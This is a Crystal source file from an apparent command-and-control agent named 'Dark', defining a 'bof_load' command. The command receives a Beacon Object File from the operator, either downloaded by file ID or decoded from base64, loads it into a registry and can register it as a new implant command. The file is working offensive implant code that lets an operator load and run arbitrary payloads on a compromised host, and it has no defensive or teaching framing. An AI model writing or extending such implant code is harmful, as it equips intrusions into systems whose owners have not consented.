require "./base"
require "base64"

module Dark::Agent::Commands
  class BofLoad < Base
    def name : String
      "bof_load"
    end

    def execute(task : JSON::Any) : Nil
      task_id = task["id"]?.try(&.as_s) || ""
      bof_name = task["parameters"]["command"]?.try(&.as_s) || ""
      file_id = task["parameters"]["file_id"]?.try(&.as_s) || ""
      bof_base64 = task["parameters"]["bof_data"]?.try(&.as_s) || ""
      bof_data = nil

      if !bof_name.empty? && !file_id.empty?
        log_debug("Downloading BOF '#{bof_name}' from file_id: #{file_id}")
        bof_data = command_handler.download_bof_file(file_id, task_id)
        if bof_data.nil?
          MessageHandler.add_response(task_id, :error, "Failed to download BOF file")
          return
        end
      elsif !bof_name.empty? && !bof_base64.empty?
        bof_data = Base64.decode(bof_base64)
      else
        MessageHandler.add_response(task_id, :error, "Missing required parameters: command and either file_id or bof_data")
        return
      end

      log_debug("Received BOF '#{bof_name}' (#{bof_data.size} bytes)")
      bof_name = bof_registry.load(bof_name, bof_data)

      # Handle special behavior for 'load' command vs 'bof_load'
      original_command = task["parameters"]["original_command"]?.try(&.as_s) || "bof_load"

      # Queue success response
      MessageHandler.add_response(task_id, :success, "Successfully loaded BOF: #{bof_name}")

      # If this was triggered by the 'load' command, also register the BOF as a new command
      if original_command == "load"
        MessageHandler.add_command(bof_name)
      end
    end

  end
end